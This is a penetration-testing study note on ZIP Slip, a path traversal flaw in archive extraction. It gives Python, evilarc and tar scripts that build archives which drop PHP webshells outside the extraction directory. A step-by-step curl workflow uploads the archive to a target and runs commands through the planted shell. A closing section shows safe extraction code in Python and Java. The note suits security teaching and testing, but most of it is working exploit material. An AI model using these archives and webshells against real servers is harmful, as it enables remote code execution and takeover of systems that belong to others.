---
tags: [vapt, file-upload, path-traversal, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.11 ZIP Slip (malicious ZIP with path traversal)"
---

# 22.11 — ZIP Slip (malicious ZIP with path traversal)

## What Is ZIP Slip?

```
ZIP SLIP:
  A directory traversal attack via malicious archive file
  
  NORMAL ZIP ENTRY:
  index.html → extracted to: /upload/extracted/index.html
  
  MALICIOUS ZIP ENTRY:
  ../../shell.php → extracted to: /upload/extracted/../../shell.php
                                 → resolves to: /shell.php (web root!)
  
  IF APP DOESN'T SANITIZE ENTRY NAMES:
  Extracted file ends up OUTSIDE the intended extraction directory!
  → Write any file anywhere the server process has write permission!
  
  IMPACT:
  - Write a webshell to web root → RCE
  - Overwrite configuration files → code execution or credential change
  - Overwrite cron jobs → scheduled execution
  - Overwrite authorized_keys → SSH access
  
  CVE: ZIP Slip affects hundreds of libraries and apps
  Disclosed by Snyk in 2018
  Affected: Java (Apache Commons Compress, Plexus Archiver, etc.),
             Ruby, Node, Python, Go, .NET
```

---

## Creating a Malicious ZIP

```bash
# METHOD 1: USING PYTHON:
python3 << 'EOF'
import zipfile

with zipfile.ZipFile('zipslip.zip', 'w') as zf:
    # Normal file (to look legitimate):
    zf.writestr('legitimate.txt', 'This is a normal file')
    
    # Malicious traversal entries:
    zf.writestr('../shell.php', '<?php system($_GET["cmd"]); ?>')
    zf.writestr('../../web_root_shell.php', '<?php system($_GET["cmd"]); ?>')
    zf.writestr('../../../tmp/shell.php', '<?php system($_GET["cmd"]); ?>')
    
    # Overwrite specific file:
    zf.writestr('../index.php', '<?php system($_GET["cmd"]); ?>')  # overwrite index!
EOF

# METHOD 2: EVILARC TOOL:
pip install evilarc
python evilarc.py shell.php -o zipslip.zip -p ../../../ -d 3 --os unix
# Creates ZIP with shell.php at path: ../../../shell.php

# METHOD 3: MANUAL WITH ZIP COMMAND (Linux):
# Create directory structure mimicking traversal:
mkdir -p "malicious_zip/path"
echo '<?php system($_GET["cmd"]); ?>' > "malicious_zip/../../shell.php"
# Note: Linux won't actually create ../../, need Python or evilarc

# VERIFY THE ZIP CONTAINS TRAVERSAL ENTRIES:
python3 -c "
import zipfile
with zipfile.ZipFile('zipslip.zip') as z:
    for name in z.namelist():
        print(name)
"
# Should show: ../shell.php etc.

# TARGET-SPECIFIC:
# If you know the target web root:
python3 << 'EOF'
import zipfile
payload = '<?php system($_GET["cmd"]); ?>'
# Target path (adjust based on target):
with zipfile.ZipFile('targeted.zip', 'w') as zf:
    zf.writestr('normal.txt', 'Normal file')
    zf.writestr('../../../../var/www/html/shell.php', payload)
    zf.writestr('../../../../var/www/html/uploads/shell.php', payload)
    zf.writestr('../shell.php', payload)
    zf.writestr('../../shell.php', payload)
EOF
```

---

## Testing for ZIP Slip

```bash
# STEP 1: FIND ZIP/ARCHIVE UPLOAD FUNCTIONALITY:
# - "Upload ZIP file" features
# - "Import archive" functionality
# - "Backup restore" with ZIP
# - Plugin/theme upload (WordPress, etc.)
# - Asset bundle upload

# STEP 2: CREATE MALICIOUS ZIP:
python3 -c "
import zipfile
with zipfile.ZipFile('test.zip', 'w') as z:
    z.writestr('../zipslip_test.txt', 'ZIP_SLIP_TEST')
    z.writestr('normal.txt', 'normal')
"

# STEP 3: UPLOAD AND CHECK:
curl -X POST https://target.com/upload-zip \
  -b "session=SESSION" \
  -F "archive=@test.zip"

# STEP 4: CHECK IF FILE WAS WRITTEN OUTSIDE EXPECTED DIR:
curl https://target.com/zipslip_test.txt
# → "ZIP_SLIP_TEST"? → ZIP Slip vulnerability!

# STEP 5: IF VULNERABLE → UPLOAD WEBSHELL ZIP:
curl -X POST https://target.com/upload-zip \
  -b "session=SESSION" \
  -F "archive=@zipslip.zip"

# STEP 6: ACCESS WEBSHELL:
curl "https://target.com/shell.php?cmd=id"
# → uid=...? → RCE via ZIP Slip!

# BONUS: TAR SLIP (same attack via .tar.gz):
python3 << 'EOF'
import tarfile, io

payload = b'<?php system($_GET["cmd"]); ?>'
info = tarfile.TarInfo(name='../../web_shell.php')
info.size = len(payload)

with tarfile.open('tarslip.tar.gz', 'w:gz') as t:
    t.addfile(info, io.BytesIO(payload))
EOF
```

---

## Fix

```
PREVENTING ZIP SLIP:

1. SANITIZE ENTRY NAMES BEFORE EXTRACTION:
   
   Python (safe extraction):
   import zipfile, os
   
   def safe_extract(zip_file, target_dir):
       target_dir = os.path.realpath(target_dir)
       
       with zipfile.ZipFile(zip_file) as z:
           for entry in z.namelist():
               # Compute the target path:
               entry_path = os.path.realpath(os.path.join(target_dir, entry))
               
               # Ensure it's inside target_dir:
               if not entry_path.startswith(target_dir + os.sep):
                   raise ValueError(f"ZIP Slip detected: {entry}")
               
               # Extract safely:
               z.extract(entry, target_dir)
   
   Java (safe extraction):
   for (ZipEntry entry : entries) {
       File destFile = new File(destDir, entry.getName());
       String destPath = destFile.getCanonicalPath();
       String destDirPath = destDir.getCanonicalPath() + File.separator;
       
       if (!destPath.startsWith(destDirPath)) {
           throw new IOException("Entry is outside of the target dir: " + entry.getName());
       }
   }

2. VALIDATE ENTRY NAMES EXPLICITLY:
   # Reject entries with:
   for entry in zip_entries:
       if '..' in entry or entry.startswith('/'):
           reject(f"Dangerous path in ZIP: {entry}")

3. USE SECURITY-AUDITED LIBRARIES:
   Python: zipfile module is safe if you validate before extracting
   Java: Use Apache Commons Compress with path validation
   Node: unzipper with path check middleware
   
4. EXTRACT TO ISOLATED DIRECTORY:
   tmp_dir = tempfile.mkdtemp()  # temp dir with random name
   safe_extract(zip_file, tmp_dir)
   # Process files from tmp_dir
   # Move only validated/needed files to actual destination
   shutil.rmtree(tmp_dir)  # Clean up
   
5. DISABLE EXTRACTION OF SYMLINKS:
   Symlinks in ZIP can also escape target directory!
   Check for and reject symlink entries:
   if os.path.islink(extracted_file):
       os.remove(extracted_file)  # Remove symlink
```

---

## Related Notes
- [[07 - File Upload + Path Traversal]] — path traversal in filename
- [[14 - Overwriting Existing Files]] — overwriting files via upload
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
